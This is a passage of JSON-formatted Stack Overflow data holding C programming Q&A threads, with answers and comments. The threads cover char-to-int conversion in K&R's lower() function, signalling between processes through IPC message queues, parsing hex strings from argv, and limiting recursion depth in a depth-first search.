&gt;= 'A' &amp;&amp; c &lt;= 'Z')\n        return c + 'a' - 'A';\n    else\n        return c;\n}\n</code></pre>\n\n<p>The function accepts <code>int</code> arguments as <code>int c</code>, and per <a href=\"https://port70.net/~nsz/c/c11/n1570.html#6.4.4.4\" rel=\"nofollow noreferrer\"><strong>6.4.4.4 Character constants</strong> of the C standard</a>, character literals are of type <code>int</code>.</p>\n\n<p>Thus the entire <code>lower</code> function, as posted, under C11 deals entirely with <code>int</code> values.</p>\n\n<p>The conversion, if any, is may be done when the function is called:</p>\n\n<pre><code>char upperA = 'A`;\n\n// this will implicitly promote the upperA char\n// value to an int value\nchar lowerA = lower( upperA );\n</code></pre>\n\n<p>Note that this is one of the differences between C and C++.  In C++, character literals are of type <code>char</code>, not <code>int</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": false, "score": 2, "last_activity_date": 1545810130, "last_edit_date": 1545810130, "creation_date": 1545809631, "answer_id": 53928897, "question_id": 53926270, "link": "https://stackoverflow.com/questions/53926270/how-exactly-is-this-function-an-example-of-a-char-to-int-conversion/53928897#53928897", "title": "How exactly is this function an example of a char to int conversion?", "body": "<blockquote>\n  <p>How exactly is this function an example of a <code>char</code> to <code>int</code> conversion?</p>\n</blockquote>\n\n<pre><code>/* lower: convert c to lower case; ASCII only */\nint lower(int c) {\n    if (c &gt;= 'A' &amp;&amp; c &lt;= 'Z')\n        return c + 'a' - 'A';\n    else\n        return c;\n}\n</code></pre>\n\n<p>It is not an example of a <code>char</code> to <code>int</code> conversion - technically incorrect by the author.</p>\n\n<hr>\n\n<p>The text goes on to discuss <code>tolower(c)</code> as an alternative to <code>lower()</code> as it \"works\" correctly even if [A -Z] are not consecutively encoded as in <a href=\"https://en.wikipedia.org/wiki/EBCDIC\" rel=\"nofollow noreferrer\">EBCDIC</a>.</p>\n\n<p>What is not discussed, is that <code>tolower()</code> functions and others (<code>is...()</code>) are only specified for <code>int</code> values in the <code>unsigned char</code> range and <code>EOF</code>.  C11 \u00a77.4 1.  Other values invoke <em>undefined behavior</em> (UB).</p>\n\n<p>It is this requirement that makes these Standard C library functions <em>conceptually</em>  <code>char</code> to <code>int</code> conversions as only values in the (about) <code>char</code> range are specified and the result is <code>int</code>.</p>\n\n<hr>\n\n<p>Now look at code where <strong><code>char</code> conversion does occur</strong>.</p>\n\n<pre><code>void my_strtolower1(char *s) {\n  while (*s) {\n    *s = lower(*s);  // conversion `char` to `int` and `int` to `char`.\n    s++;\n  }\n} \n\nvoid my_strtolower2(char *s) {\n  while (*s) {\n    *s = tolower(*s); // conversion `char` to `int` and `int` to `char`.\n    s++;\n  }\n} \n\nvoid my_strtolower3(char *s) {\n  while (*s) {\n    // conversion `char` to `unsigned char` to `int` and `int` to `char`.\n    *s = tolower((unsigned char) *s); \n    s++;\n  }\n} \n</code></pre>\n\n<p><code>my_strtolower1()</code> well defined, yet not functionally correct on rare machines where <code>[A-Z,a-z]</code> are not consecutive.</p>\n\n<p><code>my_strtolower2()</code> expected functionality except technically undefined behavior when <code>*s &lt; 0</code> (and not <code>EOF</code>).</p>\n\n<p><code>my_strtolower3()</code> expected functionality without UB when <code>*s &lt; 0</code>.</p>\n"}], "owner": {"reputation": 514, "user_id": 1219728, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/a6288e5b5f82f31c9f149378e3f6cb66?s=128&d=identicon&r=PG", "display_name": "efie", "link": "https://stackoverflow.com/users/1219728/efie"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 288, "favorite_count": 2, "accepted_answer_id": 53926327, "answer_count": 3, "score": 7, "last_activity_date": 1545857052, "creation_date": 1545780494, "last_edit_date": 1592644375, "question_id": 53926270, "link": "https://stackoverflow.com/questions/53926270/how-exactly-is-this-function-an-example-of-a-char-to-int-conversion", "title": "How exactly is this function an example of a char to int conversion?", "body": "<p>The book <em>The C Programming Language</em> by Kernighan and Ritchie, second edition states on page 43 in the chapter about <em>Type Conversions</em>:</p>\n<blockquote>\n<p>Another example of <code>char</code> to <code>int</code> conversion is the function <code>lower</code>, which maps a single character to lower case <em>for the ASCII character set</em>. If the character is not an upper case letter, <code>lower</code> returns returns it unchanged.</p>\n<pre><code>/* lower: convert c to lower case; ASCII only */\nint lower(int c)\n{\n    if (c &gt;= 'A' &amp;&amp; c &lt;= 'Z')\n        return c + 'a' - 'A';\n    else\n        return c;\n}\n</code></pre>\n</blockquote>\n<p>It isn't mentioned explicitly in the text so I'd like to make sure I understand it correctly: The conversion happens when you call the <code>lower</code> function with a variable of type <code>char</code>, doesn't it? Especially, the expression</p>\n<pre><code>c &gt;= 'A'\n</code></pre>\n<p>has nothing to do with a conversion from <code>int</code> to <code>char</code> since a character constant like <code>'A'</code>\nis handled as an <code>int</code> internally from the start, isn't it? Edit: Or is this different (e.g. a character constant being treated as a <code>char</code>) for ANSI C, which the book covers?</p>\n"}, {"tags": ["c", "linux", "signals", "ipc"], "comments": [{"owner": {"reputation": 2653, "user_id": 1028434, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a340b89a8b4efdb83da69d6cc93caac7?s=128&d=identicon&r=PG", "display_name": "fdk1342", "link": "https://stackoverflow.com/users/1028434/fdk1342"}, "edited": false, "score": 0, "creation_date": 1545787901, "post_id": 53926260, "comment_id": 94694868, "body": "On Linux there are two types of IPC Message Queues.  Refer to <code>mq_overview</code>.  As for (1), That really shouldn&#39;t be an issue if you correctly setup effective user-ids for the installed programs before users start running them.  (2) Messages aren&#39;t signals. But about messages, the receiver can poll for them or can setup of an asynchronous message handler. They also have permissions that need to be handled similar to signals. There is also named pipes and sockets available for sending data."}, {"owner": {"reputation": 85, "user_id": 3140379, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/hYTGU.jpg?s=128&g=1", "display_name": "superflash", "link": "https://stackoverflow.com/users/3140379/superflash"}, "reply_to_user": {"reputation": 2653, "user_id": 1028434, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a340b89a8b4efdb83da69d6cc93caac7?s=128&d=identicon&r=PG", "display_name": "fdk1342", "link": "https://stackoverflow.com/users/1028434/fdk1342"}, "edited": false, "score": 0, "creation_date": 1545824817, "post_id": 53926260, "comment_id": 94703713, "body": "@Fred So is it possible to have a special thread in process B that stays in a loop and continuously checks for &quot;signals messages&quot; and then polls for the right signal handler. Could the thread react properly, for example interrupt the main thread, or completely shut it down?"}], "answers": [{"tags": [], "owner": {"reputation": 165, "user_id": 10569552, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a19bab13980743df8c0947d5969894d?s=128&d=identicon&r=PG&f=1", "display_name": "anand", "link": "https://stackoverflow.com/users/10569552/anand"}, "is_accepted": false, "score": 1, "last_activity_date": 1545796583, "last_edit_date": 1545796583, "creation_date": 1545795279, "answer_id": 53927171, "question_id": 53926260, "link": "https://stackoverflow.com/questions/53926260/is-it-possible-to-send-signals-through-ipc-message-passing-queue/53927171#53927171", "title": "Is it possible to send signals through IPC Message Passing Queue?", "body": "<p>Message queues can\u2019t achieve how signals do. With signal it is possible to asynchronously interrupt or kill process but with message queue when receiving process checks message or wait on it and exits after receiving message, it actually will ignore that message rest of path of execution(synchronous). But, It is possible to achieve with threads.</p>\n"}, {"comments": [{"owner": {"reputation": 85, "user_id": 3140379, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/hYTGU.jpg?s=128&g=1", "display_name": "superflash", "link": "https://stackoverflow.com/users/3140379/superflash"}, "edited": false, "score": 0, "creation_date": 1545824930, "post_id": 53929502, "comment_id": 94703750, "body": "I would be willing to switch to POSIX message queues if that provides the required functionality. So basically everytime I send a message I can include a signal of my choice?"}, {"owner": {"reputation": 100407, "user_id": 16406, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/fadf252892475e9b177d5cd5e8b24145?s=128&d=identicon&r=PG&f=1", "display_name": "Chris Dodd", "link": "https://stackoverflow.com/users/16406/chris-dodd"}, "reply_to_user": {"reputation": 85, "user_id": 3140379, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/hYTGU.jpg?s=128&g=1", "display_name": "superflash", "link": "https://stackoverflow.com/users/3140379/superflash"}, "edited": false, "score": 0, "creation_date": 1545857397, "post_id": 53929502, "comment_id": 94714020, "body": "The signal is not included with the message or specified by the sender -- instead, the receiver can tell the kernel to send it a signal every time a message is sent to a particular message queue (by anyone)."}], "tags": [], "owner": {"reputation": 100407, "user_id": 16406, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/fadf252892475e9b177d5cd5e8b24145?s=128&d=identicon&r=PG&f=1", "display_name": "Chris Dodd", "link": "https://stackoverflow.com/users/16406/chris-dodd"}, "is_accepted": false, "score": 1, "last_activity_date": 1545813430, "creation_date": 1545813430, "answer_id": 53929502, "question_id": 53926260, "link": "https://stackoverflow.com/questions/53926260/is-it-possible-to-send-signals-through-ipc-message-passing-queue/53929502#53929502", "title": "Is it possible to send signals through IPC Message Passing Queue?", "body": "<p>If you were using a POSIX message queues (using mq_send/mq_receive), then process B can request (with mq_notify) to be sent a signal every time a message is sent to the message queue.  However, your example seems to be using a SYSV legacy message queue (msgsnd) which does not suppport any kind of notify.</p>\n"}, {"tags": [], "owner": {"reputation": 2653, "user_id": 1028434, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a340b89a8b4efdb83da69d6cc93caac7?s=128&d=identicon&r=PG", "display_name": "fdk1342", "link": "https://stackoverflow.com/users/1028434/fdk1342"}, "is_accepted": true, "score": 2, "last_activity_date": 1545841282, "creation_date": 1545841282, "answer_id": 53934507, "question_id": 53926260, "link": "https://stackoverflow.com/questions/53926260/is-it-possible-to-send-signals-through-ipc-message-passing-queue/53934507#53934507", "title": "Is it possible to send signals through IPC Message Passing Queue?", "body": "<p>Based upon your comments it seems that you want B to be able to receive messages but when it receives a \"signal\" message it needs to act like it received a regular signal.  You mentioned that the B needed to react to <code>SIGTERM</code> or <code>SIGINT</code> from the \"signal\" message.</p>\n\n<p>The way to achieve this is depends upon using POSIX message queues or System V message queues.</p>\n\n<p>Either way it doesn't seem that you want to use polling of the message queue by the main thread of B as that would add to much latency to responding to the \"signal\" message.  </p>\n\n<p>So with POSIX message queues you can use <code>mq_notify()</code> to run either a thread or raise a signal that a new message has arrived.  Otherwise B can use a thread (or even <code>fork()</code>) to poll the message queue.</p>\n\n<p>After a \"signal\" message is received you have a couple of options.  A) You can use either <code>kill</code> or <code>raise</code> in B to send a signal of the correct type to itself (or parent in case of <code>fork</code>), or B) just call a function that does what you want (that sort of thing).</p>\n\n<p>Process A can send a \"signal\" message whenever it wants.  But you need to understand that if you are using named queues they are persistent.  That is that A can send a \"signal\" message before B even starts, and then when B starts that message is waiting there.  Depending on how the message queue is made it can be N messages deep and have older messages in the queue.  One way to deal with that is for B to empty the queue before processing any of the messages.</p>\n"}], "owner": {"reputation": 85, "user_id": 3140379, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/hYTGU.jpg?s=128&g=1", "display_name": "superflash", "link": "https://stackoverflow.com/users/3140379/superflash"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 602, "favorite_count": 0, "accepted_answer_id": 53934507, "answer_count": 3, "score": 2, "last_activity_date": 1545841282, "creation_date": 1545780295, "question_id": 53926260, "link": "https://stackoverflow.com/questions/53926260/is-it-possible-to-send-signals-through-ipc-message-passing-queue", "title": "Is it possible to send signals through IPC Message Passing Queue?", "body": "<p>I have tried calling kill from process A to process B and the process B has successful reacted to the signal. The problem is I don't want to send signals from the kill function directly for two reasons:</p>\n\n<p>1) Sometimes the process A may not have the permissions, ex. process B is ran by another user</p>\n\n<p>2) I want to be able to send signals from A to B through the message queue</p>\n\n<p>I am creating a message queue from which I send \"objects\" of the following structure</p>\n\n<pre><code>typedef struct msg {\n    long message_type;\n    char message_text[SIZE];\n}message;\n</code></pre>\n\n<p>I want to know if it is possible for process A to signal B through IPC Message Passing. I know I can achieve this by sending the signal type into the message_text from process A to B and then inside the process B check the type of the signal and act properly but I was wondering if there is another way.</p>\n\n<p>Would this be possible by passing sigaction objects as messages:</p>\n\n<pre><code>struct sigaction as;\n//...\nmsgsnd(queue_id, &amp;as, length, IPC_NOWAIT);\n//...\n</code></pre>\n\n<p>I know this is completely infeasible but this is what I am trying to achieve. Thank you</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "edited": false, "score": 0, "creation_date": 1545777401, "post_id": 53925953, "comment_id": 94693596, "body": "Take each successive four characters of input, put them into a NUL-terminated buffer, <code>strtol</code> it with base <code>16</code>, append to the next index of your destination array. If the input is from <code>argv</code> as you say, you can calculate the required destination array size from <code>strlen(input) &#47; 4</code> if each valid entry is exactly four digits long."}], "answers": [{"comments": [{"owner": {"reputation": 45, "user_id": 10830882, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/851aecb8e811579fa899c2f0d088660b?s=128&d=identicon&r=PG&f=1", "display_name": "DoJo", "link": "https://stackoverflow.com/users/10830882/dojo"}, "edited": false, "score": 0, "creation_date": 1545779013, "post_id": 53926104, "comment_id": 94693845, "body": "When i pass &quot;1234&quot; to your approach i will get &quot;0x61fe&quot; but i want &quot;0x1234&quot;"}, {"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "reply_to_user": {"reputation": 45, "user_id": 10830882, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/851aecb8e811579fa899c2f0d088660b?s=128&d=identicon&r=PG&f=1", "display_name": "DoJo", "link": "https://stackoverflow.com/users/10830882/dojo"}, "edited": false, "score": 0, "creation_date": 1545779540, "post_id": 53926104, "comment_id": 94693914, "body": "@DoJo tiny mistake now is OK"}], "tags": [], "owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "is_accepted": true, "score": 0, "last_activity_date": 1545779520, "last_edit_date": 1545779520, "creation_date": 1545778339, "answer_id": 53926104, "question_id": 53925953, "link": "https://stackoverflow.com/questions/53925953/convert-a-string-from-argv-to-unsigned-byte-array/53926104#53926104", "title": "Convert a string from argv to unsigned byte array", "body": "<pre><code>unsigned hextodigit(int hex)\n{\n    unsigned result = 0;\n\n    switch(toupper(hex))\n    {\n        case '0':\n            return 0;\n            break;\n        case '1':\n            return 1;\n            break;\n        case '2':\n            return 2;\n            break;\n        case '3':\n            return 3;\n            break;\n        case '4':\n            return 4;\n            break;\n        case '5':\n            return 5;\n            break;\n        case '6':\n            return 6;\n            break;\n        case '7':\n            return 7;\n            break;\n        case '8':\n            return 8;\n            break;\n        case '9':\n            return 9;\n            break;\n        case 'A':\n            return 10;\n            break;\n        case 'B':\n            return 11;\n            break;\n        case 'C':\n            return 12;\n            break;\n        case 'D':\n            return 13;\n            break;\n        case 'E':\n            return 14;\n            break;\n        case 'F':\n            return 15;\n            break;\n        default:\n            break;\n    }\n}\n\n\nunsigned fromhex4chars(const char *str)\n{\n    return hextodigit(*(str + 3)) + (hextodigit(*(str + 2)) &lt;&lt; 4) + (hextodigit(*(str + 1)) &lt;&lt; 8) + (hextodigit(*str) &lt;&lt; 12);    \n}\n\nvoid convert(const char *str, unsigned *buff)\n{\n    size_t len = strlen(str)  / 4;\n\n    while(len--)\n    {\n        *buff++ = fromhex4chars(str);\n        str += 4;\n    }\n}\n\nint main(int argc, char **argv)\n{\n    unsigned x[100];\n\n    convert(argv[1], x);\n\n\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 45, "user_id": 10830882, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/851aecb8e811579fa899c2f0d088660b?s=128&d=identicon&r=PG&f=1", "display_name": "DoJo", "link": "https://stackoverflow.com/users/10830882/dojo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 68, "favorite_count": 0, "accepted_answer_id": 53926104, "answer_count": 1, "score": 1, "last_activity_date": 1545779520, "creation_date": 1545776053, "last_edit_date": 1545776365, "question_id": 53925953, "link": "https://stackoverflow.com/questions/53925953/convert-a-string-from-argv-to-unsigned-byte-array", "title": "Convert a string from argv to unsigned byte array", "body": "<p>For example i need an </p>\n\n<pre><code>unsigned code[] {\n    0x0001, \n    0x0002, \n    0x0003, \n    .. and so on\n}\n</code></pre>\n\n<p>from argv. I would like to input it as a stream like this:</p>\n\n<pre><code>000100020003 and so on\n</code></pre>\n"}, {"tags": ["c", "recursion"], "comments": [{"owner": {"reputation": 15044, "user_id": 416574, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/80e6a3e7975350dea41b2cf3fa46c407?s=128&d=identicon&r=PG", "display_name": "pstrjds", "link": "https://stackoverflow.com/users/416574/pstrjds"}, "edited": false, "score": 1, "creation_date": 1545773890, "post_id": 53925761, "comment_id": 94693062, "body": "Where is your return statement? I don&#39;t see where this function ever is returning anything? Is this your actual code?"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 3, "creation_date": 1545773964, "post_id": 53925761, "comment_id": 94693078, "body": "<i>How</i> did you add your counter? What does it do?"}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 2, "creation_date": 1545773992, "post_id": 53925761, "comment_id": 94693085, "body": "Where is the code with which you try to determine the depth of 3000? I would expect a depth counter, an <code>if</code> checking it and a return without recursion."}, {"owner": {"reputation": 71, "user_id": 10500431, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/37sW2.jpg?s=128&g=1", "display_name": "XLVII", "link": "https://stackoverflow.com/users/10500431/xlvii"}, "edited": false, "score": 0, "creation_date": 1545774286, "post_id": 53925761, "comment_id": 94693124, "body": "I&#39;m moving in the matrix, so I don&#39;t need the return value. For example, if matrix [i] [j] = 1 and zero are covered, it stops because no IF condition is provided."}, {"owner": {"reputation": 15044, "user_id": 416574, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/80e6a3e7975350dea41b2cf3fa46c407?s=128&d=identicon&r=PG", "display_name": "pstrjds", "link": "https://stackoverflow.com/users/416574/pstrjds"}, "edited": false, "score": 1, "creation_date": 1545774451, "post_id": 53925761, "comment_id": 94693150, "body": "Can you show us the <code>isSafe</code> function? Is that where you are checking the condition for <code>1</code>? Also, the line <code>M[row][col] = 0;</code> at the top is very suspicious to me. I would not expect a function that is performing a depth first search to modify the array entries as it is searching."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 2, "creation_date": 1545774887, "post_id": 53925761, "comment_id": 94693226, "body": "I don&#39;t understand why there is a loop. It would be simpler to execute four <code>ifSafe</code> statements in succession."}, {"owner": {"reputation": 15044, "user_id": 416574, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/80e6a3e7975350dea41b2cf3fa46c407?s=128&d=identicon&r=PG", "display_name": "pstrjds", "link": "https://stackoverflow.com/users/416574/pstrjds"}, "edited": false, "score": 1, "creation_date": 1545775060, "post_id": 53925761, "comment_id": 94693263, "body": "I am still not following what the actual goal of this method is as it never returns anything. In looking at the complete code you linked, it still doesn&#39;t make sense. You end up checking the same location multiple times, which seems unnecessary and since you never return anything from this search method, you basically just perform the search and dump the results on the floor and since every node you visit gets its value set to 0, I am just not following what your actual goal is."}, {"owner": {"reputation": 71, "user_id": 10500431, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/37sW2.jpg?s=128&g=1", "display_name": "XLVII", "link": "https://stackoverflow.com/users/10500431/xlvii"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1545775131, "post_id": 53925761, "comment_id": 94693271, "body": "because I&#39;m checking 4 directions @WeatherVane"}, {"owner": {"reputation": 15044, "user_id": 416574, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/80e6a3e7975350dea41b2cf3fa46c407?s=128&d=identicon&r=PG", "display_name": "pstrjds", "link": "https://stackoverflow.com/users/416574/pstrjds"}, "edited": false, "score": 2, "creation_date": 1545775221, "post_id": 53925761, "comment_id": 94693282, "body": "@XLVII - But you don&#39;t need the for loop to do that. The for loop is just adding unnecessary overhead. You can just have 4 sequential if statements (see Tudors answer)"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 2, "creation_date": 1545775223, "post_id": 53925761, "comment_id": 94693283, "body": "@XLVII of course, and you can remove a loop and 4 loop var conditionals as shown in an answer."}, {"owner": {"reputation": 71, "user_id": 10500431, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/37sW2.jpg?s=128&g=1", "display_name": "XLVII", "link": "https://stackoverflow.com/users/10500431/xlvii"}, "edited": false, "score": 0, "creation_date": 1545775307, "post_id": 53925761, "comment_id": 94693292, "body": "it finds values that are interconnected in four directions and all of them are 0."}, {"owner": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "edited": false, "score": 1, "creation_date": 1545775364, "post_id": 53925761, "comment_id": 94693301, "body": "@XLVII If you remove the <code>for</code> line and all four <code>if (k == \u2026)</code> lines, and their associated closing <code>}</code> lines, but keep the inner <code>if (isSafe(\u2026)) { \u2026 }</code>s, it will do exactly the same thing as it does currently, but at a considerably lower WTF factor. =)"}], "answers": [{"comments": [{"owner": {"reputation": 3971, "user_id": 2840714, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/s9vli.jpg?s=128&g=1", "display_name": "ChuckCottrill", "link": "https://stackoverflow.com/users/2840714/chuckcottrill"}, "edited": false, "score": 2, "creation_date": 1545775610, "post_id": 53925858, "comment_id": 94693341, "body": "Making depth static works, but usually you want a recursive function to be re-entrant, and thus pass the depth."}], "tags": [], "owner": {"reputation": 92, "user_id": 5326381, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ea052a5d28766260d70c65a189df74b?s=128&d=identicon&r=PG&f=1", "display_name": "Tudor Versoiu", "link": "https://stackoverflow.com/users/5326381/tudor-versoiu"}, "is_accepted": false, "score": 3, "last_activity_date": 1545775040, "creation_date": 1545775040, "answer_id": 53925858, "question_id": 53925761, "link": "https://stackoverflow.com/questions/53925761/stop-the-recursive-function-when-it-reaches-high-depth-in-c/53925858#53925858", "title": "Stop the recursive function when it reaches high depth in c", "body": "<p>First of all, the for is pointless if you took the time to write four different if's for the neighbours. They will each execute once anyways.</p>\n\n<pre><code>void DFS(bool M[][COL], int row, int col) \n{ \n    static int depth = 0;\n    ++depth;\n    if (depth &gt; 3000)\n    {\n        --depth;\n        return;\n    }\n\n    M[row][col] = 0; \n    if (isSafe(M, row , col - 1) )\n        DFS(M, row , col - 1);\n\n    if (isSafe(M, row , col + 1) )       \n       DFS(M, row , col + 1);\n\n    if (isSafe(M, row + 1, col) )     \n        DFS(M, row + 1, col);\n\n    if (isSafe(M, row - 1 , col) )        \n        DFS(M, row - 1, col);\n\n    --depth;\n    return;\n}\n</code></pre>\n\n<p>This should work. The depth variable will count the number of calls to DFS, and everytime it returns, you decrement the value. <strong>However this is not be the best approach</strong> because there are cases where it may cause problems. The only one I can think of is when you use exceptions. Because they will exit your function and not decrement the depth variable.</p>\n\n<p>Another approach is keeping the depth as a parameter, but it makes the function verbose to call.</p>\n"}, {"comments": [{"owner": {"reputation": 19667, "user_id": 1312382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FL8Fg.jpg?s=128&g=1", "display_name": "Aconcagua", "link": "https://stackoverflow.com/users/1312382/aconcagua"}, "edited": false, "score": 0, "creation_date": 1545778593, "post_id": 53925859, "comment_id": 94693783, "body": "I personally would have preferred starting with <code>depth = 0</code> and comparing <code>&gt; MAX_DEPTH</code>, feels more C-like to me... Still, +1 from me."}, {"owner": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "reply_to_user": {"reputation": 19667, "user_id": 1312382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FL8Fg.jpg?s=128&g=1", "display_name": "Aconcagua", "link": "https://stackoverflow.com/users/1312382/aconcagua"}, "edited": false, "score": 0, "creation_date": 1545778931, "post_id": 53925859, "comment_id": 94693838, "body": "@Aconcagua If you both start from zero and compare <code>&gt; MAX_DEPTH</code>, it would (if otherwise unchanged) go two deeper than <code>MAX_DEPTH</code>. That is, <code>0</code> \u2026 <code>3000</code> (which is 3001 levels, counting the first) all make the recursive calls, then <code>3001</code> (which would be the 3002th level) is still processed itself (before the <code>if (depth &gt;= MAX_DEPTH)</code> line) but doesn&#39;t recurse further. Starting from <code>0</code> but keeping the comparison would be arguably ok if the depth is defined as &quot;distance from start&quot;, though."}, {"owner": {"reputation": 19667, "user_id": 1312382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FL8Fg.jpg?s=128&g=1", "display_name": "Aconcagua", "link": "https://stackoverflow.com/users/1312382/aconcagua"}, "edited": false, "score": 0, "creation_date": 1545779619, "post_id": 53925859, "comment_id": 94693924, "body": "Ah, should have been (in my comment) <code>if(depth &lt; MAX_DEPTH) { &#47;*recursive calls*&#47; }</code>."}, {"owner": {"reputation": 19667, "user_id": 1312382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FL8Fg.jpg?s=128&g=1", "display_name": "Aconcagua", "link": "https://stackoverflow.com/users/1312382/aconcagua"}, "edited": false, "score": 0, "creation_date": 1545780411, "post_id": 53925859, "comment_id": 94694043, "body": "<i>&#39;matter of opinion&#39;</i> - sure. Well, that&#39;s why I started with <i>&#39;I personally&#39;</i>..."}], "tags": [], "owner": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "is_accepted": false, "score": 7, "last_activity_date": 1545777039, "last_edit_date": 1545777039, "creation_date": 1545775048, "answer_id": 53925859, "question_id": 53925761, "link": "https://stackoverflow.com/questions/53925761/stop-the-recursive-function-when-it-reaches-high-depth-in-c/53925859#53925859", "title": "Stop the recursive function when it reaches high depth in c", "body": "<blockquote>\n  <p>I want to stop the recursive function when it reaches 3000 depth</p>\n</blockquote>\n\n<p>A general solution to this is to add a \"depth\" argument to the function, and pass <code>depth + 1</code> to each recursive call (or <code>remaining_depth - 1</code> if you want to count backwards). To hide this from an outward-facing API, make the public function \u2013 without the depth argument \u2013 simply call the actual function with the initial value for <code>depth</code>.</p>\n\n<p>For example:</p>\n\n<pre><code>#define MAX_DEPTH 3000\n\nstatic void dfs_(bool M[][COL], int row, int col, int depth) {\n    if (!isSafe(M, row, col)) { return; }\n    M[row][col] = 0;\n    if (depth &gt;= MAX_DEPTH) { return; }\n    dfs_(M, row, col - 1, depth + 1);\n    dfs_(M, row, col + 1, depth + 1);\n    dfs_(M, row - 1, col, depth + 1);\n    dfs_(M, row + 1, col, depth + 1);\n}\n\nvoid DFS(bool M[][COL], int row, int col) {\n    dfs_(M, row, col, 1);\n} \n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "edited": false, "score": 0, "creation_date": 1545779744, "post_id": 53926222, "comment_id": 94693943, "body": "I agree with you about the <code>isSafe</code>, but why, oh why, do you want to have the same pointless <code>for</code> loop as the question? =)"}], "tags": [], "owner": {"reputation": 3560, "user_id": 5550963, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7jAip.png?s=128&g=1", "display_name": "CEPB", "link": "https://stackoverflow.com/users/5550963/cepb"}, "is_accepted": false, "score": 1, 